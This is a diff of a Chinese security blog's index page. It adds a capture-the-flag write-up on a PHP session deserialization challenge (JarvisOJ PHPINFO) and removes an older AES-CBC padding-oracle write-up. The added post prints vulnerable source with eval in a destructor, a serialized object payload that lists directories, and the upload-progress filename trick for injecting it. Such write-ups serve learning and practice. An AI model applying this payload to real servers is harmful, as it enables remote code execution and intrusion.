@@ -198,7 +198,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
           <a href="/archives">
-          <span class="site-state-item-count">67</span>
+          <span class="site-state-item-count">68</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -242,6 +242,126 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/09/01/JarvisOJ-PHPINFO/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/09/01/JarvisOJ-PHPINFO/" class="post-title-link" itemprop="url">JarvisOJ-PHPINFO</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-09-01 22:05:23" itemprop="dateCreated datePublished" datetime="2020-09-01T22:05:23+08:00">2020-09-01</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-09-02 10:54:24" itemprop="dateModified" datetime="2020-09-02T10:54:24+08:00">2020-09-02</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/09/01/JarvisOJ-PHPINFO/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/09/01/JarvisOJ-PHPINFO/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>2 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>JarvisOJ的PHPINFO，Session反序列化题。 给了源码： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 传个phpinfo参数就能看phpinfo了，PHP 5.6.21版本。 给了个类OowoO，可以eval()，但是没有任何可反序列化的地方。然后开头的设置session.serialize_handler很奇怪，并且调了session_start()，又没有用到$_SESSION，应该是SESSION的问题了。查了一下session.serialize_handler，参考<a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">这个</a>，主要问题是session.serialize_handler为php时会以<code>|</code>分割SESSION项，后接序列化内容。所以，我们可以通过将某些内容（例如变量）截断后添加<code>|</code>，手动添加我们可控的序列化内容。并且注意到phpinfo中serssion.serialize_handler的Master Value和Local Value不同。PHP中Session的处理是在脚本实际执行之前的，因此请求之前Session.serizlize_handler是以php_serialize方式运行的。这就造成了我们是以两种不同的php序列化方式运行，很容易造成反序列化漏洞。 然后回到这道题，我们需要找到一个输入点。回过头翻PHP文档，找SESSION的东西，还真有<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">这里</a>和<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/session.upload-progress.php">这里</a>，简单来说，就是如果打开了session.upload_progress.enabled，我们就可以通过form表单提交一个变量到SESSION里去。这个变量名通过phpinfo的session.upload_progress.name查看。 根据示例，我们可以照着上传upload progress变量： <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file1&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>随便上传，然后抓包。我们的攻击点在于file的name，将其修改成我们想要的反序列化值即可。 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">&quot;var_dump(scandir(chr(46)));&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> OowoO());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure> 得到<code>O:5:"OowoO":1:&#123;s:4:"mdzz";s:27:"var_dump(scandir(chr(46)));";&#125;</code>，注意$mdzz字符串最后一定要有一个<code>;</code>（eval）。然后由于requests的zz操作，我们要手动改包：</p>
+<img src="/2020/09/01/JarvisOJ-PHPINFO/file.png" class="">
+<p>首先，要以<code>|</code>开头，这是php序列化器的标志。然后所有的双引号都要转义，写Session的时候直接原样读取Content-Disposition的filename，如果不转义，由于我们要写入双引号，会造成Session序列化的截断。</p>
+<p>提交就可以列目录了。然后读文件即可，要注意disable_functions和服务器上文件路径。</p>
+<img src="/2020/09/01/JarvisOJ-PHPINFO/file2.png" class="">
+
+    <div id="aplayer-IcfSjUcd" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="462290" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
+    ></div>
+<p>flag{572ebfac-535f-46f2-873e-f7cc8bc1ecf3}</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1346,124 +1466,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-WebDog</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2020-04-23 10:22:16" itemprop="dateCreated datePublished" datetime="2020-04-23T10:22:16+08:00">2020-04-23</time>
-    </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2020-08-27 15:13:35" itemprop="dateModified" datetime="2020-08-27T15:13:35+08:00">2020-08-27</time>
-      </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
-        </span>
-    </span>
-
-  
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2020/04/23/BUUOJ%E5%88%B7%E9%A2%98-Web-WebDog/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-      </div>
-      <div class="post-meta">
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>1.5k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>NPUCTF 2020的Web🐕，很基础的AES CBC。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line">define(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line">define(<span class="string">&quot;SECRET_KEY&quot;</span>, $key);    <span class="comment">//定义密钥</span></span><br><span class="line">define(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line">define(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;source&#x27;</span>]))header(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params">$iv,$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.$iv.BR;</span><br><span class="line">    <span class="keyword">return</span> base64_encode(openssl_encrypt($data, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params">$iv,$data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> openssl_decrypt(base64_decode($data),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,$iv) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = IV;</span><br><span class="line">    $data = $flag;    </span><br><span class="line">    <span class="keyword">echo</span> aes_encrypt($iv,$data);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = @$_POST[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    $data = @$_POST[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> aes_decrypt($iv,$data);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我摊牌了，就是懒得写前端&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_GET[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>允许我们加密或解密，加密会把$flag的内容加密显示，而解密时允许我们输入IV和密文，用相同的key解密。那么看起来我们可以直接decrypt了，然后发现并不行。注意到21行解密的时候后面还加了个or，当我们解密成功时or的左端为True，那么会直接返回True，参考<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.operators.logical.php">这里</a>。所以我们还拿不到明文。</p>
-<p>然后发现它用的加密方式是AES CBC，那么就想到AES CBC的两种攻击手法：Padding Oracle和字节反转。Padding Oracle适合在不清楚key和IV的情况下解密密文，这就是我们要的。具体请参考<a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/padding-oracle-attack-zh/">这里</a>。Padding Oracle的条件是能分辨正常解密和解密失败的情况，本题解密失败时会返回False，足够区分了。</p>
-
-    <div id="aplayer-xykJVAYt" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="34040331" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="true" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86" data-loop="all"
-    ></div>
-<p>flag{0e55ec5f-fdee-4455-96a3-20ebd390da59}</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1520,14 +1522,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">296k</span>
+    <span title="站点总字数">298k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:29</span>
+    <span title="站点阅读时长">4:31</span>
   </span>
 </div>
 <div class="busuanzi-count">
